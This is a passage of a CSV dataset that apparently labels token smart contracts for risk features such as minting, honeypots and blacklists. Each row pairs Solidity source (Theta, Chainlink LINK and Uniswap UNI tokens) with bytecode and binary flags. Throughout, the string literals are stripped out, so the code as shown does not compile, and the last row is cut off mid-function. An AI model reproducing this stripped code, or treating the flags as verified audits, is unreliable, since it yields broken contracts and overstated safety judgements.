SourceCode,Bytecode,Mintable,Take_back_ownership,Owner_can_change_Balance,Hidden_Owner,Selfdestruct,With_External_Call,Cannot_Be_Bought,Modifiable_Tax,Honeypot,Pausable_Transfer,Blacklist,Whitelisted,Anti_Whale,Anti_Whale_Modifiable,Trading_with_cooldown,Assigned_Address_Slippage_is_Modifiable,Cannot_Sell_all
"pragma solidity ^0.4.18;library SafeMath { function mul(uint a, uint b) internal pure returns (uint) { if (a == 0) { return 0; } uint c = a * b; assert(c / a == b); return c; } function div(uint a, uint b) internal pure returns (uint) { uint c = a / b; return c; } function sub(uint a, uint b) internal pure returns (uint) { assert(b <= a); return a - b; } function add(uint a, uint b) internal pure returns (uint) { uint c = a + b; assert(c >= a); return c; }}contract ERC20 { function totalSupply() public constant returns (uint supply); function balanceOf(address _owner) public constant returns (uint balance); function transfer(address _to, uint _value) public returns (bool success); function transferFrom(address _from, address _to, uint _value) public returns (bool success); function approve(address _spender, uint _value) public returns (bool success); function allowance(address _owner, address _spender) public constant returns (uint remaining); event Transfer(address indexed _from, address indexed _to, uint _value); event Approval(address indexed _owner, address indexed _spender, uint _value);}contract StandardToken is ERC20 { using SafeMath for uint; uint public totalSupply; mapping (address => uint) balances; mapping (address => mapping (address => uint)) allowed; function totalSupply() public constant returns (uint) { return totalSupply; } function balanceOf(address _owner) public constant returns (uint balance) { return balances[_owner]; } function transfer(address _to, uint _value) public returns (bool success) { require(balances[msg.sender] >= _value && _value > 0); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(_value); Transfer(msg.sender, _to, _value); return true; } function transferFrom(address _from, address _to, uint _value) public returns (bool success) { require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0); balances[_from] = balances[_from].sub(_value); balances[_to] = balances[_to].add(_value); allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value); Transfer(_from, _to, _value); return true; } function approve(address _spender, uint _value) public returns (bool success) { if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) { revert(); } allowed[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); return true; } function allowance(address _owner, address _spender) public constant returns (uint remaining) { return allowed[_owner][_spender]; }}contract Controlled { address public controller; function Controlled() public { controller = msg.sender; } function changeController(address _newController) public only_controller { controller = _newController; } function getController() constant public returns (address) { return controller; } modifier only_controller { require(msg.sender == controller); _; }}contract ThetaToken is StandardToken, Controlled { using SafeMath for uint; string public constant name = ; string public constant symbol = ; uint8 public constant decimals = 18; uint unlockTime; mapping (address => bool) internal precirculated; function ThetaToken(uint _unlockTime) public { unlockTime = _unlockTime; } function transfer(address _to, uint _amount) can_transfer(msg.sender, _to) public returns (bool success) { return super.transfer(_to, _amount); } function transferFrom(address _from, address _to, uint _amount) can_transfer(_from, _to) public returns (bool success) { return super.transferFrom(_from, _to, _amount); } function mint(address _owner, uint _amount) external only_controller returns (bool) { totalSupply = totalSupply.add(_amount); balances[_owner] = balances[_owner].add(_amount); Transfer(0, _owner, _amount); return true; } function allowPrecirculation(address _addr) only_controller public { precirculated[_addr] = true; } function disallowPrecirculation(address _addr) only_controller public { precirculated[_addr] = false; } function isPrecirculationAllowed(address _addr) constant public returns(bool) { return precirculated[_addr]; } function changeUnlockTime(uint _unlockTime) only_controller public { unlockTime = _unlockTime; } function getUnlockTime() constant public returns (uint) { return unlockTime; } modifier can_transfer(address _from, address _to) { require((block.number >= unlockTime) || (isPrecirculationAllowed(_from) && isPrecirculationAllowed(_to))); _; }}",0x6060604052600436106100fc576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806306fdde0314610101578063095ea7b31461018f57806318160ddd146101e957806323b872dd146102125780633018205f1461028b578063313ce567146102e05780633cebb8231461030f57806340c10f191461034857806348f1cfdb146103a2578063602bc62b146103c557806370a08231146103ee5780638ef16d021461043b57806395d89b411461047457806399d8404514610502578063a9059cbb14610553578063cc481912146105ad578063dd62ed3e146105e6578063f77c479114610652575b600080fd5b341561010c57600080fd5b6101146106a7565b6040518080602001828103825283818151815260200191508051906020019080838360005b83811015610154578082015181840152602081019050610139565b50505050905090810190601f1680156101815780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b341561019a57600080fd5b6101cf600480803573ffffffffffffffffffffffffffffffffffffffff169060200190919080359060200190919050506106e0565b604051808215151515815260200191505060405180910390f35b34156101f457600080fd5b6101fc610869565b6040518082815260200191505060405180910390f35b341561021d57600080fd5b610271600480803573ffffffffffffffffffffffffffffffffffffffff1690602001909190803573ffffffffffffffffffffffffffffffffffffffff16906020019091908035906020019091905050610872565b604051808215151515815260200191505060405180910390f35b341561029657600080fd5b61029e6108be565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34156102eb57600080fd5b6102f36108e8565b604051808260ff1660ff16815260200191505060405180910390f35b341561031a57600080fd5b610346600480803573ffffffffffffffffffffffffffffffffffffffff169060200190919050506108ed565b005b341561035357600080fd5b610388600480803573ffffffffffffffffffffffffffffffffffffffff1690602001909190803590602001909190505061098d565b604051808215151515815260200191505060405180910390f35b34156103ad57600080fd5b6103c36004808035906020019091905050610af5565b005b34156103d057600080fd5b6103d8610b5b565b6040518082815260200191505060405180910390f35b34156103f957600080fd5b610425600480803573ffffffffffffffffffffffffffffffffffffffff16906020019091905050610b65565b6040518082815260200191505060405180910390f35b341561044657600080fd5b610472600480803573ffffffffffffffffffffffffffffffffffffffff16906020019091905050610bae565b005b341561047f57600080fd5b610487610c65565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156104c75780820151818401526020810190506104ac565b50505050905090810190601f1680156104f45780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b341561050d57600080fd5b610539600480803573ffffffffffffffffffffffffffffffffffffffff16906020019091905050610c9e565b604051808215151515815260200191505060405180910390f35b341561055e57600080fd5b610593600480803573ffffffffffffffffffffffffffffffffffffffff16906020019091908035906020019091905050610cf4565b604051808215151515815260200191505060405180910390f35b34156105b857600080fd5b6105e4600480803573ffffffffffffffffffffffffffffffffffffffff16906020019091905050610d3e565b005b34156105f157600080fd5b61063c600480803573ffffffffffffffffffffffffffffffffffffffff1690602001909190803573ffffffffffffffffffffffffffffffffffffffff16906020019091905050610df5565b6040518082815260200191505060405180910390f35b341561065d57600080fd5b610665610e7c565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6040805190810160405280600b81526020017f546865746120546f6b656e00000000000000000000000000000000000000000081525081565b600080821415801561076f57506000600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205414155b1561077957600080fd5b81600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925846040518082815260200191505060405180910390a36001905092915050565b60008054905090565b600083836004544310158061089d575061088b82610c9e565b801561089c575061089b81610c9e565b5b5b15156108a857600080fd5b6108b3868686610ea2565b925050509392505050565b6000600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b601281565b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561094957600080fd5b80600360006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b6000600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156109eb57600080fd5b610a008260005461122f90919063ffffffff16565b600081905550610a5882600160008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461122f90919063ffffffff16565b600160008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff1660007fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef846040518082815260200191505060405180910390a36001905092915050565b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141515610b5157600080fd5b8060048190555050565b6000600454905090565b6000600160008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141515610c0a57600080fd5b6001600560008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff02191690831515021790555050565b6040805190810160405280600581526020017f544845544100000000000000000000000000000000000000000000000000000081525081565b6000600560008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff169050919050565b6000338360045443101580610d1f5750610d0d82610c9e565b8015610d1e5750610d1d81610c9e565b5b5b1515610d2a57600080fd5b610d34858561124d565b9250505092915050565b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141515610d9a57600080fd5b6000600560008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff02191690831515021790555050565b6000600260008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600081600160008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205410158015610f6f575081600260008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205410155b8015610f7b5750600082115b1515610f8657600080fd5b610fd882600160008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461144290919063ffffffff16565b600160008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555061106d82600160008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461122f90919063ffffffff16565b600160008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555061113f82600260008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461144290919063ffffffff16565b600260008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef846040518082815260200191505060405180910390a3600190509392505050565b600080828401905083811015151561124357fe5b8091505092915050565b600081600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020541015801561129e5750600082115b15156112a957600080fd5b6112fb82600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461144290919063ffffffff16565b600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555061139082600160008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461122f90919063ffffffff16565b600160008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef846040518082815260200191505060405180910390a36001905092915050565b600082821115151561145057fe5b8183039050929150505600a165627a7a723058200fe1c5a3abd944bad9194ee5f79d592e5f3abe5acf868d4fe39073497baf1e600029,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
"pragma solidity ^0.4.16;library SafeMath { function mul(uint256 a, uint256 b) internal constant returns (uint256) { uint256 c = a * b; assert(a == 0 || c / a == b); return c; } function div(uint256 a, uint256 b) internal constant returns (uint256) { uint256 c = a / b; return c; } function sub(uint256 a, uint256 b) internal constant returns (uint256) { assert(b <= a); return a - b; } function add(uint256 a, uint256 b) internal constant returns (uint256) { uint256 c = a + b; assert(c >= a); return c; }}contract ERC20Basic { uint256 public totalSupply; function balanceOf(address who) constant returns (uint256); function transfer(address to, uint256 value) returns (bool); event Transfer(address indexed from, address indexed to, uint256 value);}contract ERC20 is ERC20Basic { function allowance(address owner, address spender) constant returns (uint256); function transferFrom(address from, address to, uint256 value) returns (bool); function approve(address spender, uint256 value) returns (bool); event Approval(address indexed owner, address indexed spender, uint256 value);}contract ERC677 is ERC20 { function transferAndCall(address to, uint value, bytes data) returns (bool success); event Transfer(address indexed from, address indexed to, uint value, bytes data);}contract ERC677Receiver { function onTokenTransfer(address _sender, uint _value, bytes _data);}contract BasicToken is ERC20Basic { using SafeMath for uint256; mapping(address => uint256) balances; function transfer(address _to, uint256 _value) returns (bool) { balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(_value); Transfer(msg.sender, _to, _value); return true; } function balanceOf(address _owner) constant returns (uint256 balance) { return balances[_owner]; }}contract StandardToken is ERC20, BasicToken { mapping (address => mapping (address => uint256)) allowed; function transferFrom(address _from, address _to, uint256 _value) returns (bool) { var _allowance = allowed[_from][msg.sender]; balances[_from] = balances[_from].sub(_value); balances[_to] = balances[_to].add(_value); allowed[_from][msg.sender] = _allowance.sub(_value); Transfer(_from, _to, _value); return true; } function approve(address _spender, uint256 _value) returns (bool) { allowed[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); return true; } function allowance(address _owner, address _spender) constant returns (uint256 remaining) { return allowed[_owner][_spender]; } function increaseApproval (address _spender, uint _addedValue) returns (bool success) { allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue); Approval(msg.sender, _spender, allowed[msg.sender][_spender]); return true; } function decreaseApproval (address _spender, uint _subtractedValue) returns (bool success) { uint oldValue = allowed[msg.sender][_spender]; if (_subtractedValue > oldValue) { allowed[msg.sender][_spender] = 0; } else { allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue); } Approval(msg.sender, _spender, allowed[msg.sender][_spender]); return true; }}contract ERC677Token is ERC677 { function transferAndCall(address _to, uint _value, bytes _data) public returns (bool success) { super.transfer(_to, _value); Transfer(msg.sender, _to, _value, _data); if (isContract(_to)) { contractFallback(_to, _value, _data); } return true; } function contractFallback(address _to, uint _value, bytes _data) private { ERC677Receiver receiver = ERC677Receiver(_to); receiver.onTokenTransfer(msg.sender, _value, _data); } function isContract(address _addr) private returns (bool hasCode) { uint length; assembly { length := extcodesize(_addr) } return length > 0; }}contract LinkToken is StandardToken, ERC677Token { uint public constant totalSupply = 10**27; string public constant name = ; uint8 public constant decimals = 18; string public constant symbol = ; function LinkToken() public { balances[msg.sender] = totalSupply; } function transferAndCall(address _to, uint _value, bytes _data) public validRecipient(_to) returns (bool success) { return super.transferAndCall(_to, _value, _data); } function transfer(address _to, uint _value) public validRecipient(_to) returns (bool success) { return super.transfer(_to, _value); } function approve(address _spender, uint256 _value) public validRecipient(_spender) returns (bool) { return super.approve(_spender, _value); } function transferFrom(address _from, address _to, uint256 _value) public validRecipient(_to) returns (bool) { return super.transferFrom(_from, _to, _value); } modifier validRecipient(address _recipient) { require(_recipient != address(0) && _recipient != address(this)); _; }}",0x606060405236156100b75763ffffffff7c010000000000000000000000000000000000000000000000000000000060003504166306fdde0381146100bc578063095ea7b31461014757806318160ddd1461017d57806323b872dd146101a2578063313ce567146101de5780634000aea014610207578063661884631461028057806370a08231146102b657806395d89b41146102e7578063a9059cbb14610372578063d73dd623146103a8578063dd62ed3e146103de575b600080fd5b34156100c757600080fd5b6100cf610415565b60405160208082528190810183818151815260200191508051906020019080838360005b8381101561010c5780820151818401525b6020016100f3565b50505050905090810190601f1680156101395780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b341561015257600080fd5b610169600160a060020a036004351660243561044c565b604051901515815260200160405180910390f35b341561018857600080fd5b610190610499565b60405190815260200160405180910390f35b34156101ad57600080fd5b610169600160a060020a03600435811690602435166044356104a9565b604051901515815260200160405180910390f35b34156101e957600080fd5b6101f16104f8565b60405160ff909116815260200160405180910390f35b341561021257600080fd5b61016960048035600160a060020a03169060248035919060649060443590810190830135806020601f820181900481020160405190810160405281815292919060208401838380828437509496506104fd95505050505050565b604051901515815260200160405180910390f35b341561028b57600080fd5b610169600160a060020a036004351660243561054c565b604051901515815260200160405180910390f35b34156102c157600080fd5b610190600160a060020a0360043516610648565b60405190815260200160405180910390f35b34156102f257600080fd5b6100cf610667565b60405160208082528190810183818151815260200191508051906020019080838360005b8381101561010c5780820151818401525b6020016100f3565b50505050905090810190601f1680156101395780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b341561037d57600080fd5b610169600160a060020a036004351660243561069e565b604051901515815260200160405180910390f35b34156103b357600080fd5b610169600160a060020a03600435166024356106eb565b604051901515815260200160405180910390f35b34156103e957600080fd5b610190600160a060020a0360043581169060243516610790565b60405190815260200160405180910390f35b60408051908101604052600f81527f436861696e4c696e6b20546f6b656e0000000000000000000000000000000000602082015281565b600082600160a060020a03811615801590610479575030600160a060020a031681600160a060020a031614155b151561048457600080fd5b61048e84846107bd565b91505b5b5092915050565b6b033b2e3c9fd0803ce800000081565b600082600160a060020a038116158015906104d6575030600160a060020a031681600160a060020a031614155b15156104e157600080fd5b6104ec85858561082a565b91505b5b509392505050565b601281565b600083600160a060020a0381161580159061052a575030600160a060020a031681600160a060020a031614155b151561053557600080fd5b6104ec85858561093c565b91505b5b509392505050565b600160a060020a033381166000908152600260209081526040808320938616835292905290812054808311156105a957600160a060020a0333811660009081526002602090815260408083209388168352929052908120556105e0565b6105b9818463ffffffff610a2316565b600160a060020a033381166000908152600260209081526040808320938916835292905220555b600160a060020a0333811660008181526002602090815260408083209489168084529490915290819020547f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925915190815260200160405180910390a3600191505b5092915050565b600160a060020a0381166000908152600160205260409020545b919050565b60408051908101604052600481527f4c494e4b00000000000000000000000000000000000000000000000000000000602082015281565b600082600160a060020a038116158015906106cb575030600160a060020a031681600160a060020a031614155b15156106d657600080fd5b61048e8484610a3a565b91505b5b5092915050565b600160a060020a033381166000908152600260209081526040808320938616835292905290812054610723908363ffffffff610afa16565b600160a060020a0333811660008181526002602090815260408083209489168084529490915290819020849055919290917f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b92591905190815260200160405180910390a35060015b92915050565b600160a060020a038083166000908152600260209081526040808320938516835292905220545b92915050565b600160a060020a03338116600081815260026020908152604080832094871680845294909152808220859055909291907f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9259085905190815260200160405180910390a35060015b92915050565b600160a060020a03808416600081815260026020908152604080832033909516835293815283822054928252600190529182205461086e908463ffffffff610a2316565b600160a060020a0380871660009081526001602052604080822093909355908616815220546108a3908463ffffffff610afa16565b600160a060020a0385166000908152600160205260409020556108cc818463ffffffff610a2316565b600160a060020a03808716600081815260026020908152604080832033861684529091529081902093909355908616917fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9086905190815260200160405180910390a3600191505b509392505050565b60006109488484610a3a565b5083600160a060020a031633600160a060020a03167fe19260aff97b920c7df27010903aeb9c8d2be5d310a2c67824cf3f15396e4c16858560405182815260406020820181815290820183818151815260200191508051906020019080838360005b838110156109c35780820151818401525b6020016109aa565b50505050905090810190601f1680156109f05780820380516001836020036101000a031916815260200191505b50935050505060405180910390a3610a0784610b14565b15610a1757610a17848484610b23565b5b5060015b9392505050565b600082821115610a2f57fe5b508082035b92915050565b600160a060020a033316600090815260016020526040812054610a63908363ffffffff610a2316565b600160a060020a033381166000908152600160205260408082209390935590851681522054610a98908363ffffffff610afa16565b600160a060020a0380851660008181526001602052604090819020939093559133909116907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9085905190815260200160405180910390a35060015b92915050565b600082820183811015610b0957fe5b8091505b5092915050565b6000813b908111905b50919050565b82600160a060020a03811663a4c0ed363385856040518463ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018084600160a060020a0316600160a060020a0316815260200183815260200180602001828103825283818151815260200191508051906020019080838360005b83811015610bbd5780820151818401525b602001610ba4565b50505050905090810190601f168015610bea5780820380516001836020036101000a031916815260200191505b50945050505050600060405180830381600087803b1515610c0a57600080fd5b6102c65a03f11515610c1b57600080fd5b5050505b505050505600a165627a7a72305820c5f438ff94e5ddaf2058efa0019e246c636c37a622e04bb67827c7374acad8d60029,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
"pragma solidity ^0.5.16;pragma experimental ABIEncoderV2;library SafeMath { function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; require(c >= a, ); return c; } function add(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { uint256 c = a + b; require(c >= a, errorMessage); return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { return sub(a, b, ); } function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b <= a, errorMessage); uint256 c = a - b; return c; } function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; require(c / a == b, ); return c; } function mul(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; require(c / a == b, errorMessage); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { return div(a, b, ); } function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b > 0, errorMessage); uint256 c = a / b; return c; } function mod(uint256 a, uint256 b) internal pure returns (uint256) { return mod(a, b, ); } function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b != 0, errorMessage); return a % b; }}contract Uni { string public constant name = ; string public constant symbol = ; uint8 public constant decimals = 18; uint public totalSupply = 1_000_000_000e18; address public minter; uint public mintingAllowedAfter; uint32 public constant minimumTimeBetweenMints = 1 days * 365; uint8 public constant mintCap = 2; mapping (address => mapping (address => uint96)) internal allowances; mapping (address => uint96) internal balances; mapping (address => address) public delegates; struct Checkpoint { uint32 fromBlock; uint96 votes; } mapping (address => mapping (uint32 => Checkpoint)) public checkpoints; mapping (address => uint32) public numCheckpoints; bytes32 public constant DOMAIN_TYPEHASH = keccak256(); bytes32 public constant DELEGATION_TYPEHASH = keccak256(); bytes32 public constant PERMIT_TYPEHASH = keccak256(); mapping (address => uint) public nonces; event MinterChanged(address minter, address newMinter); event DelegateChanged(address indexed delegator, address indexed fromDelegate, address indexed toDelegate); event DelegateVotesChanged(address indexed delegate, uint previousBalance, uint newBalance); event Transfer(address indexed from, address indexed to, uint256 amount); event Approval(address indexed owner, address indexed spender, uint256 amount); constructor(address account, address minter_, uint mintingAllowedAfter_) public { require(mintingAllowedAfter_ >= block.timestamp, ); balances[account] = uint96(totalSupply); emit Transfer(address(0), account, totalSupply); minter = minter_; emit MinterChanged(address(0), minter); mintingAllowedAfter = mintingAllowedAfter_; } function setMinter(address minter_) external { require(msg.sender == minter, ); emit MinterChanged(minter, minter_); minter = minter_; } function mint(address dst, uint rawAmount) external { require(msg.sender == minter, ); require(block.timestamp >= mintingAllowedAfter, ); require(dst != address(0), ); mintingAllowedAfter = SafeMath.add(block.timestamp, minimumTimeBetweenMints); uint96 amount = safe96(rawAmount, ); require(amount <= SafeMath.div(SafeMath.mul(totalSupply, mintCap), 100), ); totalSupply = safe96(SafeMath.add(totalSupply, amount), ); balances[dst] = add96(balances[dst], amount, ); emit Transfer(address(0), dst, amount); _moveDelegates(address(0), delegates[dst], amount); } function allowance(address account, address spender) external view returns (uint) { return allowances[account][spender]; } function approve(address spender, uint rawAmount) external returns (bool) { uint96 amount; if (rawAmount == uint(-1)) { amount = uint96(-1); } else { amount = safe96(rawAmount, ); } allowances[msg.sender][spender] = amount; emit Approval(msg.sender, spender, amount); return true; } function permit(address owner, address spender, uint rawAmount, uint deadline, uint8 v, bytes32 r, bytes32 s) external { uint96 amount; if (rawAmount == uint(-1)) { amount = uint96(-1); } else { amount = safe96(rawAmount, ); } bytes32 domainSeparator = keccak256(abi.encode(DOMAIN_TYPEHASH, keccak256(bytes(name)), getChainId(), address(this))); bytes32 structHash = keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, rawAmount, nonces[owner]++, deadline)); bytes32 digest = keccak256(abi.encodePacked(, domainSeparator, structHash)); address signatory = ecrecover(digest, v, r, s); require(signatory != address(0), ); require(signatory == owner, ); require(now <= deadline, ); allowances[owner][spender] = amount; emit Approval(owner, spender, amount); } function balanceOf(address account) external view returns (uint) { return balances[account]; } function transfer(address dst, uint rawAmount) external returns (bool) { uint96 amount = safe96(rawAmount, ); _transferTokens(msg.sender, dst, amount); return true; } function transferFrom(address src, address dst, uint rawAmount) external returns (bool) { address spender = msg.sender; uint96 spenderAllowance = allowances[src][spender]; uint96 amount = safe96(rawAmount, ); if (spender != src && spenderAllowance != uint96(-1)) { uint96 newAllowance = sub96(spenderAllowance, amount, ); allowances[src][spender] = newAllowance; emit Approval(src, spender, newAllowance); } _transferTokens(src, dst, amount); return true; } function delegate(address delegatee) public { return _delegate(msg.sender, delegatee); } function delegateBySig(address delegatee, uint nonce, uint expiry, uint8 v, bytes32 r, bytes32 s) public { bytes32 domainSeparator = keccak256(abi.encode(DOMAIN_TYPEHASH, keccak256(bytes(name)), getChainId(), address(this))); bytes32 structHash = keccak256(abi.encode(DELEGATION_TYPEHASH, delegatee, nonce, expiry)); bytes32 digest = keccak256(abi.encodePacked(, domainSeparator, structHash)); address signatory = ecrecover(digest, v, r, s); require(signatory != address(0), ); require(nonce == nonces[signatory]++, ); require(now <= expiry, ); return _delegate(signatory, delegatee); } function getCurrentVotes(address account) external view returns (uint96) { uint32 nCheckpoints = numCheckpoints[account]; return nCheckpoints > 0 ? checkpoints[account][nCheckpoints - 1].votes : 0; } function getPriorVotes(address account, uint blockNumber) public view returns (uint96) { require(blockNumber < block.number, ); uint32 nCheckpoints = numCheckpoints[account]; if (nCheckpoints == 0) { return 0; } if (checkpoints[account][nCheckpoints - 1].fromBlock <= blockNumber) { return checkpoints[account][nCheckpoints - 1].votes; } if (checkpoints[account][0].fromBlock > blockNumber) { return 0; } uint32 lower = 0; uint32 upper = nCheckpoints - 1; while (upper > lower) { uint32 center = upper - (upper - lower) / 2; Checkpoint memory cp = checkpoints[account][center]; if (cp.fromBlock == blockNumber) { return cp.votes; } else if (cp.fromBlock < blockNumber) { lower = center; } else { upper = center - 1; } } return checkpoints[account][lower].votes; } function _delegate(address delegator, address delegatee) internal { address currentDelegate = delegates[delegator]; uint96 delegatorBalance = balances[delegator]; delegates[delegator] = delegatee; emit DelegateChanged(delegator, currentDelegate, delegatee); _moveDelegates(currentDelegate, delegatee, delegatorBalance); } function _transferTokens(address src, address dst, uint96 amount) internal { require(src != address(0), ); require(dst != address(0), ); balances[src] = sub96(balances[src], amount, ); balances[dst] = add96(balances[dst], amount, ); emit Transfer(src, dst, amount); _moveDelegates(delegates[src], delegates[dst], amount); } function _moveDelegates(address srcRep, address dstRep, uint96 amount) internal { if (srcRep != dstRep && amount > 0) { if (srcRep != address(0)) { uint32 srcRepNum = numCheckpoints[srcRep]; uint96 srcRepOld = srcRepNum > 0 ? checkpoints[srcRep][srcRepNum - 1].votes : 0; uint96 srcRepNew = sub96(srcRepOld, amount, ); _writeCheckpoint(srcRep, srcRepNum, srcRepOld, srcRepNew); } if (dstRep != address(0)) { uint32 dstRepNum = numCheckpoints[dstRep]; uint96 dstRepOld = dstRepNum > 0 ? checkpoints[dstRep][dstRepNum - 1].votes : 0; uint96 dstRepNew = add96(dstRepOld, amount, ); _writeCheckpoint(dstRep, dstRepNum, dstRepOld, dstRepNew); } } } function _writeCheckpoint(address delegatee, uint32 nCheckpoints, uint96 oldVotes, uint96 newVotes) internal { uint32 blockNumber = safe32(block.number, ); if (nCheckpoints > 0 && checkpoints[delegatee][nCheckpoints - 1].fromBlock == blockNumber) { checkpoints[delegatee][nCheckpoints - 1].votes = newVotes; } else { checkpoints[delegatee][nCheckpoints] = Checkpoint(blockNumber, newVotes); numCheckpoints[delegatee] = nCheckpoints + 1; } emit DelegateVotesChanged(delegatee, oldVotes, newVotes); } function 